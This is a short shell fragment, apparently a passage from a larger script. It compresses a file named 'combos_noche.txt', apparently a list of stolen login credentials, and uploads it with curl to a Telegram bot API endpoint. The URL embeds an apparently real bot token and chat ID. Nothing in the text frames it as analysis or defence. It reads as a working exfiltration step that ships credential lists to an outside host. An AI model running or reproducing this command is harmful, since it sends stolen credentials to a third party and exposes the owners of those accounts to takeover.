          zip -9 combos.zip combos_noche.txt
          curl -F document=@"combos.zip" https://api.telegram.org/bot8575399229:AAHBcjak2HSG3uoA1_yA64zJ3P0b0C9p0p4/sendDocument?chat_id=7210756206
          
